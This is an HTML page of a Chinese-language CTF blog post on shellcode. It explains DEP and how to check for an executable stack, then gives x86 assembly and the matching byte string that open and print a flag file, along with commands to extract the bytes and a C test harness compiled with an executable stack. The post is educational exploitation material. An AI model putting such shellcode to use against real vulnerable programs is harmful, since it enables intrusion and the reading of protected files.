
<!DOCTYPE html>
<html lang="null">
    
<head>
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="MarsBlog">
    <title>Shellcode - MarsBlog</title>
    <meta name="author" content="Mars Huang">
    
    
    <meta name="description" content="###Shellcodevulvul.c
###shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。
###shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler">
<meta property="og:type" content="blog">
<meta property="og:title" content="Shellcode">
<meta property="og:url" content="/2015/11/21/Shellcode/index.html">
<meta property="og:site_name" content="MarsBlog">
<meta property="og:description" content="###Shellcodevulvul.c
###shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。
###shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler">
<meta property="og:updated_time" content="2015-12-14T12:24:17.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Shellcode">
<meta name="twitter:description" content="###Shellcodevulvul.c
###shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。
###shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler">
    
    
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style.min.css" type="text/css">
    <!--STYLES END-->
    
</head>

    <body>
        <div id="blog">
            <header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <h1 class="header-title">
        <a class="header-title-link" href="/ ">MarsBlog</a>
    </h1>
    
</header>
            <nav id="sidebar" data-behavior="4">
    
    
        <ul class="sidebar-buttons">
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/ "
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                    <span class="sidebar-button-desc">Início</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/all-categories"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
                    <span class="sidebar-button-desc">Categorias</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/all-tags"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                    <span class="sidebar-button-desc">Tags</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/all-archives"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                    <span class="sidebar-button-desc">Arquivo</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link st-search-show-outputs"
                         href="/#search"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-search"></i>
                    <span class="sidebar-button-desc">Pesquisar</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/#about"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                    <span class="sidebar-button-desc">Sobre</span>
                </a>
        </li>
        
    </ul>
    
        <ul class="sidebar-buttons">
        
    </ul>
    
</nav>

            
            <div id="main" data-behavior="4"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post" itemscope itemType="http://schema.org/BlogPosting">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title" itemprop="headline">
            Shellcode
        </h1>
    
    <div class="post-meta">
    <time itemprop="datePublished" content="Sat Nov 21 2015 12:35:59 GMT+0800">
	
		    21/11/2015
    	
    </time>
    
</div>
</div>
    
    <div class="post-content markdown" itemprop="articleBody">
        <div class="main-content-wrap">
            <p>###Shellcode<br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTedV9GNEpGMmxOcm8" target="_blank" rel="external">vul</a><br><a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeM0FyTWFXblE0WEE" target="_blank" rel="external">vul.c</a></p>
<p>###shellcode 是一串可執行的 machine code，由於最常使用的功能為產生 shell 提供攻擊者操作介面而稱之，但是其實只要是這種形式的 payload 不管是否真的用來拿 shell 都可以稱為 shellcode。</p>
<p>###shellcode 通常透過撰寫組合語言之後透過工具而得，直接寫高階語言也可以做得到，但是因為 compiler 會自動幫 programmer 加入不少東西因此產生的 shellcode 也會有太多不必要的部分因而容易出錯，因此採用組合語言是比較簡單的作法。</p>
<p>###現在由於系統多預設開啟 DEP (可執行處不可寫，可寫處不可執行)，因此 shellcode 的用處已經大大降低，不過事實上有許多線上服務還在使用非常舊的系統，前陣子新聞才說法國機場停擺起因於用了 n 年的 windows 3.1 當機惹，現在想想其實機場採用 windows 3.1 一直沒更新也真的是頗為神奇。</p>
<p>###要怎麼看有沒有開啟 DEP 呢？透過下列指令觀看 stack 段是否有可以執行的權限就知道了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vul &#38;&#9;&#9;&#9;&#9;// &#32972;&#26223;&#22519;&#34892;&#10;ps&#9;&#9;&#9;&#9;// &#21015;&#20986;&#30446;&#21069;&#27491;&#22312;&#22519;&#34892;&#30340; process id&#10;cat /proc/`pidof vul`/maps</span><br></pre></td></tr></table></figure>
<p>###如果發現 stack 段可以執行，表示 local variable 中的 buffer 可能可以 overflow 之後跳至 shellcode 區域執行，實作拿到 shell 的 asm code 其實 google 一下有頗多資料，因此其實常常並不需要真的自己寫，現在已實作開啟 /home/shellcode/flag 為例的 shellcode</p>
<p>###fileread.asm<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global _start&#13; &#13;section .text&#13; &#13;_start:&#13;  xor ecx, ecx &#9;&#9;&#9;&#9;; set ecx to 0&#13;  xor eax, eax &#9;&#9;&#9;&#9;; set eax to 0&#13;&#13;open:&#13;  mov al, 0x05 &#9;&#9;&#9;&#9;; system call 5 is &#8216;open&#8217;&#13;  push ecx&#13;  &#13;  push 0x67616c66 ;galf&#13;  push 0x2f65646f ;/edo&#13;  push 0x636c6c65 ;clle&#13;  push 0x68732f65 ;hs/e&#13;  push 0x6d6f682f ;moh/&#13;&#13;  mov ebx, esp&#13;  int 0x80&#9;&#9;&#9;&#9;; call system call&#13; &#13;read:&#13;  xchg eax, ebx&#9;&#9;&#9;; exchange value of two register&#13;  xchg eax, ecx&#13;  mov al, 0x03&#13;  mov dx, 0x0FFF&#13;  inc edx&#13;  int 0x80&#13; &#13;write:&#13;  xchg eax, edx&#13;  mov bl, 0x01&#13;  shr eax, 0x0A&#13;  int 0x80&#13; &#13;exit:&#13;  xchg eax, ebx&#13;  int 0x80</span><br></pre></td></tr></table></figure></p>
<p>###其實以上 asm 也是 github 開放原始碼的資料稍做修改而已，以上 asm 做的事情為先設定要用到的 register 為零 (初始化)，再來利用 open system call 開啟 /home/shellcode/flag 檔案 (little endian)，然後利用 read system call 讀取資料後再用 write system call 顯示在螢幕上，最後 exit system call 結束程式。</p>
<p>###shellcode寫好之後需要測試是否能正確執行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf xxx.asm  &#13;// -f: choose the format&#13;// &#21487;&#20197;&#21152;&#19978; -o xxx &#20358;&#25351;&#23450;&#36664;&#20986;&#30340; object file &#21517;&#31281;&#13;// &#33509;&#27794;&#26377; -o &#21063;&#38928;&#35373;&#28858; xxx.o &#27284;&#26696;&#36664;&#20986;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -s -o xxx.o fileName&#13;// ld: static linker&#13;// -m elf_i386 &#36664;&#20986; x86 elf&#13;// -s: strip-all (&#28165;&#38500;&#19981;&#24517;&#35201;&#30340;&#35338;&#24687;&#65292;&#20351;&#25991;&#20214;&#28187;&#32933;)&#13;// -o &#25351;&#23450;&#35201;&#36899;&#32080;&#30340; object file</span><br></pre></td></tr></table></figure>
<p>###elf: (Executable and Linkable Format)<br>指 linux 上的執行檔，地位相同於 windows 上的 exe 檔案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d xxx.o or xxx(executable)&#13;// &#21487;&#20197;&#36879;&#36942; objdump &#21453;&#32068;&#35695; object &#25110;&#26159; elf &#27284;&#26696;&#25104; asm &#21450; machine code&#13;&#13;objdump -d ./filename.o|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&#34;/&#39;|sed &#39;s/$/&#34;/g&#39;&#10;&#13;// &#20197;&#19978;&#25351;&#20196;&#21152;&#20837;&#27491;&#30906;&#27284;&#21517;&#20043;&#24460;&#21487;&#20197;&#21934;&#29544;&#21015;&#20986; objdump &#30340; machine &#32080;&#26524;&#20006;&#19988;&#21152;&#19978; \x</span><br></pre></td></tr></table></figure>
<p>###完成上述步驟之後就可以實際執行 shellcode 測試，先在本地端實際加上 /home/shellcode/flag 檔案並且加入 hello world 於 flag 檔案中，透過下列方式於 C 語言中執行 shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char code[] = &#34;\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x66\x6c\x61\x67\x68\x6f\x64\x65\x2f\x68\x65\x6c\x6c\x63\x68\x65\x2f\x73\x68\x68\x2f\x68\x6f\x6d\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80&#34;;&#10;&#13;int main(int argc, char **argv)&#13;&#123;&#13;&#13;  int (*func)();&#13;  func = (int (*)()) code;&#13;  (int)(*func)();&#13;&#125;</span><br></pre></td></tr></table></figure>
<p>###上述程式執行指向 shellcode 的記憶體位置後執行之，透過下列指令編譯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 test.c -z execstack&#13;// m32: &#32232;&#35695;&#20986; 32bit &#22519;&#34892;&#27284;&#26696;&#13;// -z execstack: &#20351;&#24471; stack &#27573;&#28858;&#21487;&#22519;&#34892;</span><br></pre></td></tr></table></figure>
<p>###執行編譯出來的 x86 elf 執行檔看看是否會出現 hello world 就知道成功與否</p>
<p>###在貼上自己的 shellcode 之前可以先用下列方式測試是否真的能成功執行 shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char code[] = &#34;\xeb\xfe\n&#34;;&#10;// &#30456;&#30070;&#26044;&#28961;&#31406;&#36852;&#22280;&#25351;&#20196;</span><br></pre></td></tr></table></figure>
<p>###若執行該段 shellcode 的時候程式沒有 crash 那表示該區段確實可以放置 shellcode 並且執行之<br>(如果塞了沒有意義的 shellcode 則執行時就會 segmentation fault)</p>
<p>###<a href="https://drive.google.com/open?id=0BzGd3Qn1ZnTedDlnZ2lBZV9lRFU" target="_blank" rel="external">payload.py</a></p>

            
                

            
        </div>
    </div>
    <div class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">ETIQUETADO em</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/ctf-pwn/">ctf pwn</a>

            </div>
        
        <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/24/待吃清單/"  data-tooltip="待吃清單">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">ANTERIOR</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/20/ROP-Return-Oriented-Programming/" data-tooltip="ROP (Return Oriented Programming)">
                
                    <span class="hide-xs hide-sm text-small icon-mr">PRÓXIMO</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=/2015/11/21/Shellcode/">
                <i class="fa fa-google-plus"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=/2015/11/21/Shellcode/">
                <i class="fa fa-facebook-official"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=/2015/11/21/Shellcode/">
                <i class="fa fa-twitter"></i>
            </a>
        </li>
        
            <li class="post-action">
                <a class="post-action-btn btn btn--default" href="#disqus_thread">
                    <i class="fa fa-comment-o"></i>
                </a>
            </li>
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#">
            
                <i class="fa fa-list"></i>
            </a>
        </li>
    </ul>
</div>


        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2016 Mars Huang. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/24/待吃清單/"  data-tooltip="待吃清單">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">ANTERIOR</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/20/ROP-Return-Oriented-Programming/" data-tooltip="ROP (Return Oriented Programming)">
                
                    <span class="hide-xs hide-sm text-small icon-mr">PRÓXIMO</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=/2015/11/21/Shellcode/">
                <i class="fa fa-google-plus"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=/2015/11/21/Shellcode/">
                <i class="fa fa-facebook-official"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=/2015/11/21/Shellcode/">
                <i class="fa fa-twitter"></i>
            </a>
        </li>
        
            <li class="post-action">
                <a class="post-action-btn btn btn--default" href="#disqus_thread">
                    <i class="fa fa-comment-o"></i>
                </a>
            </li>
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#">
            
                <i class="fa fa-list"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
    <ul class="share-options">
        <li class="share-option">
            <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=/2015/11/21/Shellcode/">
                <i class="fa fa-google-plus"></i><span class="">Share on Google Plus</span>
            </a>
        </li>
        <li class="share-option">
            <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=/2015/11/21/Shellcode/">
                <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
            </a>
        </li>
        <li class="share-option">
            <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=/2015/11/21/Shellcode/">
                <i class="fa fa-twitter"></i><span>Share on Twitter</span>
            </a>
        </li>
    </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
            
        </div>
        <div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <h4 id="about-card-name">Mars Huang</h4>
        
            <h5 id="about-card-bio"><p>author.bio</p>
</h5>
        
        
            <h5 id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>author.job</p>

            </h5>
        
        
    </div>
</div>

        <div id="cover" style="background-image:url('http://res.cloudinary.com/tranquilpeak-hexo-theme/image/upload/v1438975482/v1.3.0-cover.jpg');"></div>
    </body>
    <!--SCRIPTS-->
<script src="/assets/js/script.min.js" type="text/javascript"></script>
<!--SCRIPTS END-->



</html>
